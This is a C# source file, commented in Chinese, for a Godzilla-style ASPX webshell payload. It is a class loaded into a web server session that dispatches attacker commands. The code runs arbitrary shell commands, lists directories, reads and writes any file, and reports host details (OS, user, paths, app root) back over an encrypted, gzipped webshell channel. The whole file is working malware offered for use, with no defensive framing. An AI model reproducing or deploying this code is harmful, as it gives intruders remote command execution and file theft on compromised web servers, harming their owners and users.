// 哥斯拉型 ASPX 会话态 dispatcher（godzilla-aspx 通道，CSHAP_AES_BASE64 同型线协议）：
// 马侧首请求 Assembly.Load 存 Session；后续 equals 注入（byte[] 参数流 / MemoryStream 输出
// 缓冲），toString() 执行并把 gzip(Parameter 序列化结果) 写入输出缓冲（马侧加密回传）。
// 方法分派（自有约定，与 WsmG 同集）：probe / cmd(c[,d]) / ls(p) / read(p) / write(p,b[,m])。
// 约束：类名 UG；仅 mscorlib/System 层 API（mono mcs 编译，IIS/mono 双侧可载）；单 class。
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

public class UG {

	byte[] parameters;
	MemoryStream output;

	public override bool Equals(object o) {
		byte[] b = o as byte[];
		if (b != null) { parameters = b; return true; }
		MemoryStream m = o as MemoryStream;
		if (m != null) { output = m; return true; }
		return true;
	}

	public override string ToString() { Run(); return ""; }

	string Run() {
		try {
			Dictionary<string, byte[]> m = Parse(Gunzip(parameters));
			string method = Str(m, "methodName");
			byte[] outB;
			string status = "ok";
			try { outB = Exec(method, m); }
			catch (Exception e) { status = "err"; outB = Encoding.UTF8.GetBytes(e.Message); }
			Dictionary<string, byte[]> r = new Dictionary<string, byte[]>();
			r["status"] = Encoding.UTF8.GetBytes(status);
			r["o"] = outB;
			byte[] body = Gzip(Serialize(r));
			output.Write(body, 0, body.Length);
		} catch { }
		return "";
	}

	byte[] Exec(string method, Dictionary<string, byte[]> m) {
		if (method == "cmd") {
			bool win = Environment.OSVersion.Platform == PlatformID.Win32NT;
			ProcessStartInfo psi = new ProcessStartInfo(
				win ? "cmd.exe" : "/bin/sh", (win ? "/c " : "-c ") + Str(m, "c")) {
				RedirectStandardOutput = true, RedirectStandardError = true,
				UseShellExecute = false, CreateNoWindow = true
			};
			string d = Str(m, "d");
			if (d.Length > 0) psi.WorkingDirectory = d;
			using (Process p = Process.Start(psi)) {
				string o = p.StandardOutput.ReadToEnd();
				string e = p.StandardError.ReadToEnd();
				p.WaitForExit();
				return Encoding.UTF8.GetBytes(o + e);
			}
		}
		if (method == "ls") {
			StringBuilder sb = new StringBuilder("[");
			string[] entries = Directory.GetFileSystemEntries(Str(m, "p"));
			for (int i = 0; i < entries.Length; i++) {
				bool isDir = Directory.Exists(entries[i]);
				DateTime wt = isDir ? Directory.GetLastWriteTimeUtc(entries[i]) : File.GetLastWriteTimeUtc(entries[i]);
				FileInfo fi = isDir ? null : new FileInfo(entries[i]);
				if (sb.Length > 1) sb.Append(",");
				sb.Append("{\"n\":\"").Append(Esc(Path.GetFileName(entries[i])))
					.Append("\",\"d\":").Append(isDir ? "true" : "false")
					.Append(",\"s\":").Append(isDir ? 0 : fi.Length)
					.Append(",\"r\":true,\"w\":").Append((isDir || !fi.IsReadOnly) ? "true" : "false")
					.Append(",\"m\":").Append((long)(wt - new DateTime(1970, 1, 1)).TotalMilliseconds)
					.Append("}");
			}
			return Encoding.UTF8.GetBytes(sb.Append("]").ToString());
		}
		if (method == "read") {
			return Encoding.UTF8.GetBytes(Convert.ToBase64String(File.ReadAllBytes(Str(m, "p"))));
		}
		if (method == "write") {
			byte[] data = m.ContainsKey("b") ? m["b"] : new byte[0];
			string path = Str(m, "p");
			bool append = Str(m, "m") == "a";
			using (FileStream fs = new FileStream(path, append ? FileMode.Append : FileMode.Create, FileAccess.Write)) {
				fs.Write(data, 0, data.Length);
			}
			return Encoding.UTF8.GetBytes("OK " + data.Length);
		}
		if (method == "probe") {
			StringBuilder sb = new StringBuilder("WSM1|").Append(Str(m, "t"))
				.Append("|").Append(Environment.OSVersion.ToString().Replace(' ', '_'))
				.Append("|").Append(Environment.UserName)
				.Append("|").Append(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
				.Append("|").Append(Environment.CurrentDirectory)
				.Append("|").Append(Environment.Version.ToString())
				.Append("|").Append(Environment.ProcessorCount)
				.Append("|").Append(AppRoot());
			return Encoding.UTF8.GetBytes(sb.ToString());
		}
		throw new Exception("unknown method " + method);
	}

	static string AppRoot() {
		try { return System.Web.HttpRuntime.AppDomainAppPath; } catch { return ""; }
	}

	static string Str(Dictionary<string, byte[]> m, string k) {
		byte[] v;
		return m.TryGetValue(k, out v) ? Encoding.UTF8.GetString(v) : "";
	}

	static string Esc(string s) { return s.Replace("\\", "\\\\").Replace("\"", "\\\""); }

	// Parameter 序列化：key + 0x02 + int32LE(len) + value（与 Java 侧同构）
	static byte[] Serialize(Dictionary<string, byte[]> d) {
		MemoryStream o = new MemoryStream();
		foreach (KeyValuePair<string, byte[]> e in d) {
			byte[] k = Encoding.UTF8.GetBytes(e.Key);
			byte[] v = e.Value ?? new byte[0];
			o.Write(k, 0, k.Length);
			o.WriteByte(2);
			o.WriteByte((byte)(v.Length & 0xFF));
			o.WriteByte((byte)((v.Length >> 8) & 0xFF));
			o.WriteByte((byte)((v.Length >> 16) & 0xFF));
			o.WriteByte((byte)((v.Length >> 24) & 0xFF));
			o.Write(v, 0, v.Length);
		}
		return o.ToArray();
	}

	static Dictionary<string, byte[]> Parse(byte[] data) {
		Dictionary<string, byte[]> outMap = new Dictionary<string, byte[]>();
		int o = 0;
		while (o < data.Length) {
			int sep = Array.IndexOf(data, (byte)2, o);
			if (sep == -1) break;
			string key = Encoding.UTF8.GetString(data, o, sep - o);
			int len = data[sep + 1] | (data[sep + 2] << 8) | (data[sep + 3] << 16) | (data[sep + 4] << 24);
			o = sep + 5 + len;
			if (o > data.Length) break;
			byte[] v = new byte[len];
			Array.Copy(data, sep + 5, v, 0, len);
			outMap[key] = v;
		}
		return outMap;
	}

	static byte[] Gunzip(byte[] d) {
		if (d == null || d.Length < 2 || d[0] != 0x1f || d[1] != 0x8b) return d ?? new byte[0];
		using (System.IO.Compression.GZipStream z = new System.IO.Compression.GZipStream(new MemoryStream(d), System.IO.Compression.CompressionMode.Decompress))
		using (MemoryStream o = new MemoryStream()) {
			byte[] b = new byte[8192];
			int n;
			while ((n = z.Read(b, 0, b.Length)) > 0) o.Write(b, 0, n);
			return o.ToArray();
		}
	}

	static byte[] Gzip(byte[] d) {
		MemoryStream o = new MemoryStream();
		using (System.IO.Compression.GZipStream z = new System.IO.Compression.GZipStream(o, System.IO.Compression.CompressionMode.Compress)) {
			z.Write(d, 0, d.Length);
		}
		return o.ToArray();
	}
}
